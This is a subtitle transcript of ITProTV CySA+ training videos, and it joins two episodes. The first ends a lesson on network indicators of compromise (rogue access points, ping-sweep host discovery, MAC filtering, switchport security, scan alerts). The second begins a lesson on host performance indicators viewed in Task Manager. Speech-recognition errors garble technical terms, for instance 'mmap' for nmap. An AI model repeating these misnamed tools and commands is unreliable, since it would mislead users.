home.\n\n397\n00:21:22.381 --> 00:21:24.520\n&gt;&gt; They can't tell me that I can't have\n\n398\n00:21:24.520 --> 00:21:26.684\nwireless in my office.\n&gt;&gt; I know, I know,\n\n399\n00:21:26.684 --> 00:21:30.060\nthey think they run the show and\nthey cut the checks.\n\n400\n00:21:30.060 --> 00:21:32.847\nUnfortunately, for them,,\nit's not the way it works, right?\n\n401\n00:21:32.847 --> 00:21:34.150\nSo these things happen.\n\n402\n00:21:34.150 --> 00:21:36.970\nHow do we detect that occurring though?\n\n403\n00:21:36.970 --> 00:21:38.140\nWhat do we do?\n\n404\n00:21:38.140 --> 00:21:38.800\nYou know what we do?\n\n405\n00:21:39.990 --> 00:21:44.420\nWe monitor, we use the rules, right?\n&gt;&gt; I'm picking up a theme here today.\n\n406\n00:21:44.420 --> 00:21:45.390\n&gt;&gt; Yeah, I hope so,\n\n407\n00:21:45.390 --> 00:21:48.310\nI hope this is starting to burn\nyour little brain right now.\n\n408\n00:21:48.310 --> 00:21:49.830\nLet me jump back over\ninto my calling machine.\n\n409\n00:21:50.960 --> 00:21:55.650\nI'll exit out of our C2 server here,\nand quit that.\n\n410\n00:21:55.650 --> 00:21:58.632\nClear that out, and\nCV back to the home directory.\n\n411\n00:21:58.632 --> 00:22:02.850\nOne more clear, let's clear everything.\n\n412\n00:22:02.850 --> 00:22:03.730\nAnd, what can we do?\n\n413\n00:22:03.730 --> 00:22:06.130\nHow can we find this host discovery?\n\n414\n00:22:06.130 --> 00:22:08.160\nHow do I know when our\nhost is on my network?\n\n415\n00:22:08.160 --> 00:22:11.570\nI use host discovery detectors,\nthat's exactly what we do.\n\n416\n00:22:11.570 --> 00:22:15.840\nFire up good old mmap, a lovely little\ndevice that we have at our beck and\n\n417\n00:22:15.840 --> 00:22:17.780\ncall, it does a great job of this.\n\n418\n00:22:17.780 --> 00:22:19.049\nMaybe run a custom script,\nI've done that too.\n\n419\n00:22:19.049 --> 00:22:22.080\nI just need this little quick and\ndirty thing.\n\n420\n00:22:22.080 --> 00:22:24.030\nBut typically mmap is a great way to go.\n\n421\n00:22:24.030 --> 00:22:28.325\nSolarwinds, all these other big\ncentralized management systems,\n\n422\n00:22:28.325 --> 00:22:32.232\nthey all have host discovery,\nat least most, I wanna say all of them.\n\n423\n00:22:32.232 --> 00:22:35.410\nI'm speaking with hyperbole\nto get my point across.\n\n424\n00:22:35.410 --> 00:22:38.510\nThis bowling ball does not weigh a ton\neven though I said it weighs a ton, right?\n\n425\n00:22:38.510 --> 00:22:39.910\nThat kind of idea.\n\n426\n00:22:39.910 --> 00:22:41.330\nAlmost all of them, if not all of them,\n\n427\n00:22:41.330 --> 00:22:43.940\nwill have some sort of\nhost discovery feature.\n\n428\n00:22:43.940 --> 00:22:48.930\nSo now, from time to time,\nI need to be running an mmap scan and say,\n\n429\n00:22:48.930 --> 00:22:49.920\nwhat hosts are around my network?\n\n430\n00:22:49.920 --> 00:22:54.740\nLet me make sure that the list that I\nhave lines up with the list that I get\n\n431\n00:22:54.740 --> 00:22:55.930\nusing host discovery.\n\n432\n00:22:55.930 --> 00:22:59.122\nAnd of course, there's gonna be machines\nthat are down, that aren't turned on or\n\n433\n00:22:59.122 --> 00:23:00.230\nmaintenance is occurring.\n\n434\n00:23:00.230 --> 00:23:02.760\nMaybe they've become unplugged or\nwhatever, they're having issues.\n\n435\n00:23:02.760 --> 00:23:05.140\nBut I can start getting a good\nidea through just doing that.\n\n436\n00:23:05.140 --> 00:23:10.581\nSo just run your good old mmap -sn,\nand then give it your network,\n\n437\n00:23:10.581 --> 00:23:13.920\nso 192.168.55.0/24.\n\n438\n00:23:13.920 --> 00:23:17.670\nI like to give it the network range,\n\n439\n00:23:17.670 --> 00:23:20.720\njust let it do its thing,\nthat's really helpful.\n\n440\n00:23:20.720 --> 00:23:24.623\nThen you fire that off, and\nhere we go, we got some machines,\n\n441\n00:23:24.623 --> 00:23:30.700\n551 157 226 254 and 225 are all up.\n\n442\n00:23:30.700 --> 00:23:35.498\nI now look at my network documentation and\ngo, anything look amiss, right?\n\n443\n00:23:35.498 --> 00:23:39.715\nMaybe that 0.255, I'm like what's 0.225?\n&gt;&gt; That's not on my list\n\n444\n00:23:39.715 --> 00:23:41.267\n&gt;&gt; Yeah, that's not on my list,\n\n445\n00:23:41.267 --> 00:23:43.008\nthat's a wireless access point.\n\n446\n00:23:43.008 --> 00:23:48.244\nI do further investigation on why that is\nnot jiving with what I should be seeing or\n\n447\n00:23:48.244 --> 00:23:51.960\nat least in my mind according\nto my documentation.\n\n448\n00:23:51.960 --> 00:23:54.640\nSo these are ways we can do,\ndefinitely check that.\n\n449\n00:23:54.640 --> 00:23:57.256\nWe can also do like mac\naddress verification,\n\n450\n00:23:57.256 --> 00:24:01.362\nwe can go into the system and say,\nonly these mac addresses are allowed.\n\n451\n00:24:01.362 --> 00:24:05.585\nIf I see MACs, now MACs are easily\nspoofed, don't get me wrong.\n\n452\n00:24:05.585 --> 00:24:09.651\nBut it's just layered defense,\nlayered defense, right?\n\n453\n00:24:09.651 --> 00:24:13.188\nJust because it's easily bypassed doesn't\nmean you shouldn't invest the time and\n\n454\n00:24:13.188 --> 00:24:14.480\neffort into doing it.\n\n455\n00:24:14.480 --> 00:24:18.036\nIt does give another hurdle someone has to\ncross before they're able to compromise\n\n456\n00:24:18.036 --> 00:24:18.757\nyour networks.\n\n457\n00:24:18.757 --> 00:24:21.550\nJust keep that in mind.\n\n458\n00:24:21.550 --> 00:24:24.600\nSo MAC whitelisting, blacklisting,\nhowever you wanna put it,\n\n459\n00:24:24.600 --> 00:24:26.970\nit just depends on your perspective\nthat you're looking at.\n\n460\n00:24:26.970 --> 00:24:31.670\nDoing our host discovery with ping suites,\nsite surveys, walking around taking a heat\n\n461\n00:24:31.670 --> 00:24:36.675\nmap looking for signal strengths about\nwireless devices, and looking for,\n\n462\n00:24:36.675 --> 00:24:38.840\nhm, I don't recognize that.\n\n463\n00:24:38.840 --> 00:24:43.270\nIt's all about us being familiar with\nwhat our environment looks like.\n\n464\n00:24:43.270 --> 00:24:47.579\nAnd automating as much can to that end, so\nas it grows and becomes a little more than\n\n465\n00:24:47.579 --> 00:24:51.887\nwe can handle as humans, I guess in the\nphysical world, letting the digital world\n\n466\n00:24:51.887 --> 00:24:56.086\nhandle that heavy lifting and take over\nfor us, doing that as much as possible.\n\n467\n00:24:56.086 --> 00:25:01.378\nWith wireless,\nthese are remediation techniques.\n\n468\n00:25:01.378 --> 00:25:04.805\nWe can use address filtering,\nwork with encryption,\n\n469\n00:25:04.805 --> 00:25:07.730\nmake sure authentication is going on.\n\n470\n00:25:07.730 --> 00:25:11.000\nCheck for signal strength\nto find those road devices.\n\n471\n00:25:11.000 --> 00:25:14.215\nWith wire devices, I guess you can\ndo this with wireless as well.\n\n472\n00:25:14.215 --> 00:25:16.799\nWith NAC devices, NAC systems,\nputting them in a place,\n\n473\n00:25:16.799 --> 00:25:19.824\nthere's network access control\nsystems that are available to us.\n\n474\n00:25:19.824 --> 00:25:23.634\nPut one of those in place, so\nthat someone's just not able to walk up,\n\n475\n00:25:23.634 --> 00:25:26.750\nplug in, and turn on and say,\nI'm part of your network.\n\n476\n00:25:26.750 --> 00:25:31.160\nInside of Cisco devices,\nyou can use Switchport Security.\n\n477\n00:25:31.160 --> 00:25:32.628\nIt's a wired thing.\n\n478\n00:25:32.628 --> 00:25:37.332\nI can go into the Cisco switch,\nget into the specific interfaces or\n\n479\n00:25:37.332 --> 00:25:41.374\nthe range of interfaces and\nsay, Switchport Security.\n\n480\n00:25:41.374 --> 00:25:43.716\nAnd it will be, I'm trying to think,\n\n481\n00:25:43.716 --> 00:25:49.090\nit's been a while since I've had to\nactually implement Switchport Security.\n\n482\n00:25:49.090 --> 00:25:55.070\nThere will be a sticky, so a sticky is\nbasically dynamically learned, whatever\n\n483\n00:25:55.070 --> 00:25:56.605\nyou plug in first, that's what goes here.\n\n484\n00:25:56.605 --> 00:25:57.720\n&gt;&gt; Mm-hm.\n&gt;&gt; Right?\n\n485\n00:25:57.720 --> 00:26:02.520\nOr I can set a Mac address and say this is\nthe Mac address I want to be on this port.\n\n486\n00:26:02.520 --> 00:26:04.354\nYou see, a different Mac address,\n\n487\n00:26:04.354 --> 00:26:08.100\nI define then what do I do if I see\nsomething different than what I expect.\n\n488\n00:26:08.100 --> 00:26:10.080\nAnd then the switch will act accordingly.\n\n489\n00:26:10.080 --> 00:26:13.570\nMaybe do a shutdown of the interface and\nit has to be remediated by\n\n490\n00:26:13.570 --> 00:26:17.690\nthe administrator and makes you forcibly,\nmakes you physically go and,\n\n491\n00:26:17.690 --> 00:26:21.380\nlook, what is plugged in to this\nport that it is shutting down?\n\n492\n00:26:22.610 --> 00:26:24.850\nSomeone's plugged in a laptop here.\n\n493\n00:26:24.850 --> 00:26:27.760\nWhat's that little device called\na land turtle sitting there?\n\n494\n00:26:27.760 --> 00:26:28.990\nThat's not good.\n\n495\n00:26:28.990 --> 00:26:31.600\nI need to remove that, that's bad.\n\n496\n00:26:31.600 --> 00:26:33.670\nHow did that get there in the first place?\n\n497\n00:26:33.670 --> 00:26:35.850\nAnd now you start rolling down.\n\n498\n00:26:35.850 --> 00:26:38.082\nWe've had an incident,\nlet's follow the incident response.\n\n499\n00:26:38.082 --> 00:26:41.545\nAll right, scan sweeps,\nkinda covered that.\n\n500\n00:26:41.545 --> 00:26:43.630\nSomeone scanning your network.\n\n501\n00:26:43.630 --> 00:26:46.966\nRemember, scanning is a very common\nthing that happens on the Internet.\n\n502\n00:26:46.966 --> 00:26:52.765\nSo if you see scans through your IDS or\nIPS, like I said, I saw that on mine.\n\n503\n00:26:52.765 --> 00:26:57.385\nAnd the only thing that made me think\nsomething was strange about it was the way\n\n504\n00:26:57.385 --> 00:26:59.180\nin which it was scanning.\n\n505\n00:26:59.180 --> 00:27:02.740\nI kept seeing the same scan from\nthe same machine over and over and\n\n506\n00:27:02.740 --> 00:27:04.200\nover again over the same port.\n\n507\n00:27:04.200 --> 00:27:08.430\nThat's weird, but to see someone scanning\nyour network, that is not weird.\n\n508\n00:27:08.430 --> 00:27:09.744\nThat is actually quite common.\n\n509\n00:27:09.744 --> 00:27:15.489\nSo you'll get a little jaundiced to that,\na little numb to the effect of seeing,\n\n510\n00:27:15.489 --> 00:27:18.768\nsomeone's scanning my network.\n&gt;&gt; [LAUGH]\n\n511\n00:27:18.768 --> 00:27:19.348\n&gt;&gt; Right?\n\n512\n00:27:19.348 --> 00:27:21.840\nYeah, you and everyone else, right?\n\n513\n00:27:21.840 --> 00:27:24.444\nThis is a very common thing,\nso just be aware of that.\n\n514\n00:27:24.444 --> 00:27:28.980\nLike I said, it might not be\nhigh on your priority list.\n\n515\n00:27:28.980 --> 00:27:33.924\nBut if you see something a little farther,\na little more, like what we did,\n\n516\n00:27:33.924 --> 00:27:36.487\nyou might wanna investigate further.\n\n517\n00:27:36.487 --> 00:27:40.260\nBut if you do see scanning, you just gotta\nremember that that might be happening.\n\n518\n00:27:40.260 --> 00:27:44.375\nSo make sure you create a IDS or IPS rule\nthat says, hey, you've been scanned.\n\n519\n00:27:44.375 --> 00:27:49.798\nAnd maybe set an alert that says if I get\nx amount or types of scans, let me know.\n\n520\n00:27:49.798 --> 00:27:52.600\nAnd now I wanna take a little\nfurther investigation.\n\n521\n00:27:52.600 --> 00:27:55.360\nSo trying to look for those edge cases and\n\n522\n00:27:55.360 --> 00:27:58.255\nbuild that into your rule set,\nso that you're aware of that.\n\n523\n00:27:58.255 --> 00:28:03.820\nCuz that's an indication more of a pointed\ntargeting of your actual environment and\n\n524\n00:28:03.820 --> 00:28:05.260\nnot just random scans that happen.\n\n525\n00:28:05.260 --> 00:28:09.680\nEverybody's looking for open ports and\neasy low-hanging fruit.\n\n526\n00:28:09.680 --> 00:28:12.950\nYou know you're secured correctly cuz\nyou don't have low-hanging fruit and\n\n527\n00:28:12.950 --> 00:28:15.030\nyou're still seeing scans from\nthe same person over and over and\n\n528\n00:28:15.030 --> 00:28:19.350\nover again, now you want to take\na closer look with that, right?\n\n529\n00:28:19.350 --> 00:28:22.120\nAnd that would go along with\nunusual traffic spikes,\n\n530\n00:28:22.120 --> 00:28:23.660\nweird stuff that's happening.\n\n531\n00:28:23.660 --> 00:28:25.480\nWhy am I getting ten\n\n532\n00:28:25.480 --> 00:28:28.150\nbillion requests to my web server?\n&gt;&gt; [LAUGH]\n\n533\n00:28:28.150 --> 00:28:29.734\n&gt;&gt; Well, it could be a denial of\n\n534\n00:28:29.734 --> 00:28:33.562\nservice attack or just Ellen DeGeneres\nmessaged you on the Emmy's.\n\n535\n00:28:33.562 --> 00:28:34.371\n&gt;&gt; Right.\n\n536\n00:28:34.371 --> 00:28:35.235\n&gt;&gt; Or what was it,\n\n537\n00:28:35.235 --> 00:28:36.790\nthe Oscar's?\n&gt;&gt; Yep.\n\n538\n00:28:36.790 --> 00:28:37.920\n&gt;&gt; Which happened to, I believe,\n\n539\n00:28:37.920 --> 00:28:39.037\nInstagram.\n&gt;&gt; That was Instagram?\n\n540\n00:28:39.037 --> 00:28:40.745\n&gt;&gt; Yeah, I think that was Instragram or\n\n541\n00:28:40.745 --> 00:28:42.011\nFacebook, one of the two,\n\n542\n00:28:42.011 --> 00:28:45.800\nwhere she was like, let's take\na selfie and post it on Instagram.\n\n543\n00:28:45.800 --> 00:28:47.960\nIn the crowd, there was a celebrities.\n\n544\n00:28:47.960 --> 00:28:50.050\nEverybody wanted to go see that photo.\n\n545\n00:28:50.050 --> 00:28:55.200\nAnd it effectively denial of service\nthat hacked Instagram or whoever it was.\n\n546\n00:28:55.200 --> 00:28:57.965\nThat doesn't mean you're a targeted\nattack, it was just an accident.\n\n547\n00:28:57.965 --> 00:28:59.480\nYou just got super popular.\n\n548\n00:28:59.480 --> 00:29:03.490\nSo spikes in activity doesn't necessarily\nmean there's an attack that's happening.\n\n549\n00:29:03.490 --> 00:29:05.760\nBut it doesn't mean that it isn't\nan attack that's happening.\n\n550\n00:29:05.760 --> 00:29:07.930\nIt's your job to see those spikes.\n\n551\n00:29:07.930 --> 00:29:09.150\nHow do we know that there are spikes,\n\n552\n00:29:09.150 --> 00:29:10.970\nMike, any guess?\n&gt;&gt; I hope\n\n553\n00:29:10.970 --> 00:29:11.487\nwe're monitoring.\n&gt;&gt; [LAUGH]\n\n554\n00:29:11.487 --> 00:29:12.929\n&gt;&gt; That's right.\n\n555\n00:29:12.929 --> 00:29:14.469\n&gt;&gt; And we know what should be there,\n\n556\n00:29:14.469 --> 00:29:18.080\nright, or what activity we should see.\n&gt;&gt; That's exactly right.\n\n557\n00:29:18.080 --> 00:29:19.866\nWe're banging the same drum,\nover and over again.\n\n558\n00:29:19.866 --> 00:29:24.406\nWe're monitoring, we have IDS and IPS,\nusing firewalls, using detection.\n\n559\n00:29:24.406 --> 00:29:28.400\nWe have baselines that we've taken, so\nwe can see that's not normal, right?\n\n560\n00:29:28.400 --> 00:29:30.010\nWe know what normal looks like.\n\n561\n00:29:30.010 --> 00:29:31.074\nWe've got NetFlow running.\n\n562\n00:29:31.074 --> 00:29:35.710\nAll of the sudden, our router went\nfrom being the number one talker, or\n\n563\n00:29:35.710 --> 00:29:38.250\nour web server did, to host a.\n\n564\n00:29:38.250 --> 00:29:39.161\nWhy is host a?\n\n565\n00:29:39.161 --> 00:29:42.767\nI can understand the web server having a\nlot of traffic, but why has host a got so\n\n566\n00:29:42.767 --> 00:29:44.859\nmuch traffic that it's overtaken, right?\n\n567\n00:29:44.859 --> 00:29:47.140\nThere's a spike in the traffic.\n\n568\n00:29:47.140 --> 00:29:47.942\nWhat's going on?\n\n569\n00:29:47.942 --> 00:29:51.020\nSo definitely want to use those.\n\n570\n00:29:51.020 --> 00:29:52.861\nLog analysis well, don't forget that.\n\n571\n00:29:52.861 --> 00:29:56.474\nOn other bandwidth utilization, system\nutilization, I'm seeing a spike in CPU and\n\n572\n00:29:56.474 --> 00:29:57.288\nthings like that.\n\n573\n00:29:57.288 --> 00:30:00.980\nWe're gonna look at more into the host,\napplication based in the next episode.\n\n574\n00:30:00.980 --> 00:30:05.464\nBut here remediation, IP asset,\nuse a intrusion prevention system,\n\n575\n00:30:05.464 --> 00:30:07.345\nnot just a detection system.\n\n576\n00:30:07.345 --> 00:30:09.818\nBut I've seen this spike in traffic.\n\n577\n00:30:09.818 --> 00:30:11.520\nI'm gonna investigate it.\n\n578\n00:30:11.520 --> 00:30:14.830\nIt sees that it is an attack,\nand it actively is blocking it.\n\n579\n00:30:15.950 --> 00:30:18.576\nAlso, next gen firewalling,\nthat'll help with this as well.\n\n580\n00:30:18.576 --> 00:30:21.394\nImplement these things, and it will help\nwhen you see these spikes in traffic.\n\n581\n00:30:21.394 --> 00:30:26.126\nSo if someone's trying to DDoS you, it can\nhandle that, see that traffic, kill it,\n\n582\n00:30:26.126 --> 00:30:29.465\nbefore it's able to negatively\naffect your environment.\n\n583\n00:30:29.465 --> 00:30:33.710\nMike, I think that's about all\nwe've got when it comes to network\n\n584\n00:30:33.710 --> 00:30:35.090\nindicators are compromised.\n\n585\n00:30:35.090 --> 00:30:37.320\nIn the next,\nwe'll move into those host and\n\n586\n00:30:37.320 --> 00:30:40.200\napplications.\n&gt;&gt; All right, Daniel, sounds great.\n\n587\n00:30:40.200 --> 00:30:41.310\nGreat explanation.\n\n588\n00:30:42.660 --> 00:30:45.830\nWhat those things look like,\nwhat we should be looking for, and\n\n589\n00:30:45.830 --> 00:30:47.630\nwhat we need to do about it\nwhen we see those things.\n\n590\n00:30:47.630 --> 00:30:48.989\nSo we appreciate that.\nHope everybody out\n\n591\n00:30:48.989 --> 00:30:50.605\nthere enjoyed watching this one.\n\n592\n00:30:50.605 --> 00:30:53.530\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n593\n00:30:53.530 --> 00:30:54.310\n&gt;&gt; And I'm Daniel Lowry.\n\n594\n00:30:54.310 --> 00:30:54.917\n&gt;&gt; And we'll see you next time.\n\n595\n00:30:54.917 --> 00:31:02.657\n[MUSIC]\n\n596\n00:31:02.657 --> 00:31:05.396\n&gt;&gt; Thank you for watching ITPRO.TV.\n\n",

00:00:08.442\n[MUSIC]\n\n4\n00:00:08.442 --> 00:00:12.864\n&gt;&gt; You're watching ITPro.TV.\n&gt;&gt; Hello,\n\n5\n00:00:12.864 --> 00:00:15.837\nwelcome to another exciting\nepisode here at ITPro.TV.\n\n6\n00:00:15.837 --> 00:00:19.780\nI'm your host Mike Rodrick,\ntoday we'll doing our CySA+.\n\n7\n00:00:19.780 --> 00:00:23.471\nAnd in this episode, we're gonna be\ntakin a look indicators of compromise.\n\n8\n00:00:23.471 --> 00:00:26.738\nThis time focusing in on hosts and\napplications.\n\n9\n00:00:26.738 --> 00:00:28.922\nHere to help us with that is none\nother than, Mr. Daniel Lowrie.\n\n10\n00:00:28.922 --> 00:00:31.545\nWelcome back, Daniel.\n&gt;&gt; Hey Mike, how is it going on today?\n\n11\n00:00:31.545 --> 00:00:32.768\nHaving a good on hopefully.\n\n12\n00:00:32.768 --> 00:00:34.325\nHopefully you are as well.\n\n13\n00:00:34.325 --> 00:00:38.540\nWe're back for more of that good CySA+\nmaterial for you folks out there.\n\n14\n00:00:38.540 --> 00:00:40.759\nSo you can pass your exam and\nlearn a thing or two,\n\n15\n00:00:40.759 --> 00:00:42.557\nthat's the goal in today's episode.\n\n16\n00:00:42.557 --> 00:00:43.489\n&gt;&gt; Hopefully, right?\n\n17\n00:00:43.489 --> 00:00:43.993\n&gt;&gt; Yeah.\n&gt;&gt; [LAUGH]\n\n18\n00:00:43.993 --> 00:00:45.840\n&gt;&gt; So you're looking at, indicators\n\n19\n00:00:45.840 --> 00:00:50.591\nare compromised when it comes to posts and\napplications which applications host.\n\n20\n00:00:50.591 --> 00:00:54.076\nSo applications have been compromised\nmost likely definitely as well.\n\n21\n00:00:54.076 --> 00:00:54.964\n&gt;&gt; [LAUGH] Right.\n\n22\n00:00:54.964 --> 00:00:55.822\n&gt;&gt; Yeah, there you go,\n\n23\n00:00:55.822 --> 00:00:56.926\nthat's gonna be a fun one.\n\n24\n00:00:56.926 --> 00:01:01.692\nBut there are couple of key things that\nwe are able to spot or identify, so\n\n25\n00:01:01.692 --> 00:01:05.619\nthat we can go, hey,\nthere might be something wrong here.\n\n26\n00:01:05.619 --> 00:01:08.231\nSo that's what we are going\nto try run down for today.\n\n27\n00:01:08.231 --> 00:01:09.904\n&gt;&gt; All right, sounds good,\n\n28\n00:01:09.904 --> 00:01:14.772\nthe first thing I take of is performance\nissues, when it comes to indicators\n\n29\n00:01:14.772 --> 00:01:19.735\nof compromised of my host as an end user,\nwhy is this darn thing going so slow?\n\n30\n00:01:19.735 --> 00:01:21.726\nAnd I know we can break it down to\na little more detail than that.\n\n31\n00:01:21.726 --> 00:01:23.503\n&gt;&gt; Yeah, we'll definitely break it down,\n\n32\n00:01:23.503 --> 00:01:25.545\nbut Mike,\nI think you're spot on right there.\n\n33\n00:01:25.545 --> 00:01:29.924\nTypically, Mike's worked on this,\nI've done this, phone rings,\n\n34\n00:01:29.924 --> 00:01:34.452\nyou pick it up, someone says my computer\nis acting strangely or slowly or\n\n35\n00:01:34.452 --> 00:01:35.298\nboth.\n&gt;&gt; Or both.\n\n36\n00:01:35.298 --> 00:01:36.245\n&gt;&gt; Or both, yeah,\n\n37\n00:01:36.245 --> 00:01:38.415\nand you say, what do you mean by that?\n\n38\n00:01:38.415 --> 00:01:41.535\nWell, I click on this and I go get a cup\nof coffee and eat a sandwich and come back\n\n39\n00:01:41.535 --> 00:01:44.084\nand it's still scrolling, it's waiting.\n&gt;&gt; [LAUGH]\n\n40\n00:01:44.084 --> 00:01:45.043\n&gt;&gt; Well, what's going on?\n\n41\n00:01:45.043 --> 00:01:48.128\nOkay, there does definitely seem\nto be something slow going on\n\n42\n00:01:48.128 --> 00:01:49.185\nwith your computer.\n\n43\n00:01:49.185 --> 00:01:50.391\nLet's take a look at it.\n\n44\n00:01:50.391 --> 00:01:52.732\nWhat do I mean when we\nsay take a look at it?\n\n45\n00:01:52.732 --> 00:01:57.120\nAnd that's what we're gonna dive into,\nthat performance aspect of the machine.\n\n46\n00:01:57.120 --> 00:02:00.530\nHow do I verify that when Bob or\nSue or Billy or\n\n47\n00:02:00.530 --> 00:02:04.940\nwhoever calls, or is it whomever,\nI think it's whomever, whomever calls and\n\n48\n00:02:04.940 --> 00:02:09.100\nsays my machine is acting strangely or\nslowly.\n\n49\n00:02:09.100 --> 00:02:13.569\nHow do I check the performance to see if\nthere's anything odd that's happened?\n\n50\n00:02:13.569 --> 00:02:15.424\nLet's look into that.\n\n51\n00:02:15.424 --> 00:02:17.747\nLet's jump into my\nWindows 10 machine here.\n\n52\n00:02:17.747 --> 00:02:19.450\nI've got this thing up and running.\n\n53\n00:02:19.450 --> 00:02:22.960\nWe've got a few different tools that\nare ready to be able to do this.\n\n54\n00:02:22.960 --> 00:02:23.806\nThe first one and\n\n55\n00:02:23.806 --> 00:02:27.749\nthe easiest one to get started with is\njust the good old Task Manager, right?\n\n56\n00:02:27.749 --> 00:02:32.751\nSo I'll get down here, just a little\naway from that, if you right-click\n\n57\n00:02:32.751 --> 00:02:37.687\non the taskbar down here,\nyou'll get the Task Manager option, right?\n\n58\n00:02:37.687 --> 00:02:38.737\nThere you go.\n\n59\n00:02:38.737 --> 00:02:41.428\nAnd then it will bring this guy up,\nand you'll notice,\n\n60\n00:02:41.428 --> 00:02:44.020\nI'm already met with some\nperformance indicators.\n\n61\n00:02:44.020 --> 00:02:47.715\nLet me just slide it over here\nto get it out of the way.\n\n62\n00:02:47.715 --> 00:02:51.036\nYou'll notice I'm seing CPU,\nmemory disk and network,\n\n63\n00:02:51.036 --> 00:02:55.253\nthe big four as we like to call them\naround the water cooler in the IT world.\n\n64\n00:02:55.253 --> 00:03:01.256\nI'm already starting to see around\n2% of my CPU, 4%, 9%, I'm up to 10.\n\n65\n00:03:01.256 --> 00:03:03.719\nIf I saw this thing maxed out at a 100%,\n\n66\n00:03:03.719 --> 00:03:07.360\nthat's gonna be an indication\nof something that's going on.\n\n67\n00:03:07.360 --> 00:03:11.634\nYour gonna wanna look at what\nis causing 100% CPU utilization.\n\n68\n00:03:11.634 --> 00:03:15.446\nYou will see this with\nspecific types of malware.\n\n69\n00:03:15.446 --> 00:03:18.630\nMemory might be eaten up at 100%.\n\n70\n00:03:18.630 --> 00:03:21.046\nWhat is taking up all the memory?\n\n71\n00:03:21.046 --> 00:03:22.641\nThis could just be a memory leak.\n\n72\n00:03:22.641 --> 00:03:27.070\nBad applications, this does happen,\nit's been on for 16 days.\n\n73\n00:03:27.070 --> 00:03:29.426\nIt's continued to leak until\nit's eaten all the memory up.\n\n74\n00:03:29.426 --> 00:03:30.344\n&gt;&gt; I use Chrome.\n\n75\n00:03:30.344 --> 00:03:31.050\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n76\n00:03:31.050 --> 00:03:31.550\n&gt;&gt; Sorry.\n\n77\n00:03:31.550 --> 00:03:32.397\n&gt;&gt; Mike's aware of this.\n\n78\n00:03:32.397 --> 00:03:33.485\n[LAUGH]\n\n79\n00:03:33.485 --> 00:03:34.812\n&gt;&gt; [LAUGH]\n\n80\n00:03:34.812 --> 00:03:37.026\n&gt;&gt; I don't, cuz I use Firefox, so\n\n81\n00:03:37.026 --> 00:03:39.900\nI got to experience that problem.\nDisk,\n\n82\n00:03:39.900 --> 00:03:44.105\nif I saw disk utiization going\nto the roof and climbing, that\n\n83\n00:03:44.105 --> 00:03:48.918\ncould definitely cost performance issues.\nBecause of things like swap files,\n\n84\n00:03:48.918 --> 00:03:52.308\npage files, whatever they call them,\nwhere you try to write the disk and\n\n85\n00:03:52.308 --> 00:03:56.164\nthere's no more space.\nAnd now how do I push things around,\n\n86\n00:03:56.164 --> 00:04:00.007\nhow do I even access stuff\nwith 100% full disk?\n\n87\n00:04:00.007 --> 00:04:02.077\nI have seen Ronnie's disk,\n\n88\n00:04:02.077 --> 00:04:03.975\non his old Macbook, man,\n\n89\n00:04:03.975 --> 00:04:07.218\nI think he had 8 megabytes of free space.\n&gt;&gt; Holy\n\n90\n00:04:07.218 --> 00:04:07.723\nhell.\n&gt;&gt; And\n\n91\n00:04:07.723 --> 00:04:10.134\nit was still performing\nlike the [INAUDIBLE],\n\n92\n00:04:10.134 --> 00:04:12.818\nI was very impressed with that.\n&gt;&gt; Wow.\n\n93\n00:04:12.818 --> 00:04:13.359\n&gt;&gt; Typically,\n\n94\n00:04:13.359 --> 00:04:16.809\nI don't want this machine that would not\ndedicate this, so just keep that in mind.\n\n95\n00:04:16.809 --> 00:04:19.549\nThen of course network, if they're saying,\n\n96\n00:04:19.549 --> 00:04:23.484\nI'm trying to access this network share,\nI'm trying to work with\n\n97\n00:04:23.484 --> 00:04:27.209\nthis application that is accessing\na database to the network or\n\n98\n00:04:27.209 --> 00:04:29.793\nsomething.\nAnd it seems really like you're really\n\n99\n00:04:29.793 --> 00:04:32.395\nslow, we'll take a look at\ntheir network utilization,\n\n100\n00:04:32.395 --> 00:04:36.555\nsee if you can see anything there.\nNow this is a very, very small but\n\n101\n00:04:36.555 --> 00:04:40.698\neasy look at the network itself or\nthe disk, memory,\n\n102\n00:04:40.698 --> 00:04:45.058\nCPU as it were, whatever the case is.\nYou can actually go over\n\n103\n00:04:45.058 --> 00:04:48.630\nto the Performance tab,\nget a little bit more information,\n\n104\n00:04:48.630 --> 00:04:51.432\nsee a little more of\na graphical representation\n\n105\n00:04:51.432 --> 00:04:54.759\nof what's going on.\nAnd you'll notice that this is all in\n\n106\n00:04:54.759 --> 00:04:58.271\nreal time, this is constantly\nupdating itself as to show you,\n\n107\n00:04:58.271 --> 00:05:01.589\nright now this is what's happening.\nOkay, well, now that's old,\n\n108\n00:05:01.589 --> 00:05:05.702\nnow this is what's happening right now.\nSo it continually updates all of these\n\n109\n00:05:05.702 --> 00:05:10.551\nperformance indicators that we see\nin the Task Manager performance tab\n\n110\n00:05:10.551 --> 00:05:14.341\nis doing that stuff in real time.\nSo we get to see this CPU,\n\n111\n00:05:14.341 --> 00:05:19.086\nguess the little information about CPU.\nSo we should have an idea of what\n\n112\n00:05:19.086 --> 00:05:23.337\nCPU's daily usage look like\nbecause we take our baseline.\n\n113\n00:05:23.337 --> 00:05:26.177\nThat's right, we take baseline or\n\n114\n00:05:26.177 --> 00:05:30.352\njust lean on the everyday user for\nthe information.\n\n115\n00:05:30.352 --> 00:05:32.053\nDo you typically run this process?\n\n116\n00:05:32.053 --> 00:05:33.536\nDo you typically run that process,\n\n117\n00:05:33.536 --> 00:05:37.500\nis this something you're familiar with?\nWhen I had to clean up malware instances,\n\n118\n00:05:37.500 --> 00:05:41.290\nit's because something calls up.\nAnd I go, have you installed any software,\n\n119\n00:05:41.290 --> 00:05:43.989\nhave you clipped a new links,\nhave you downloaded anything?\n\n120\n00:05:43.989 --> 00:05:46.316\nNo, sure, I haven't, of course.\n\n121\n00:05:46.316 --> 00:05:47.180\n&gt;&gt; Of course not.\n\n122\n00:05:47.180 --> 00:05:49.225\n&gt;&gt; They never do anything wrong, do they?\n\n123\n00:05:49.225 --> 00:05:51.154\nAnd then you gotta go into well,\n\n124\n00:05:51.154 --> 00:05:54.269\nwhat is running, right?\nAnd see what's going on, but here,\n\n125\n00:05:54.269 --> 00:05:58.251\nI get that more graphical representation.\nI'm looking for spikes, maybe some spiking\n\n126\n00:05:58.251 --> 00:06:01.474\nis just happening and it's going up.\nStaying there for a moment and\n\n127\n00:06:01.474 --> 00:06:04.453\nthen coming back down.\nI wanna go back and look at what process\n\n128\n00:06:04.453 --> 00:06:08.517\nmight have cause that damage, 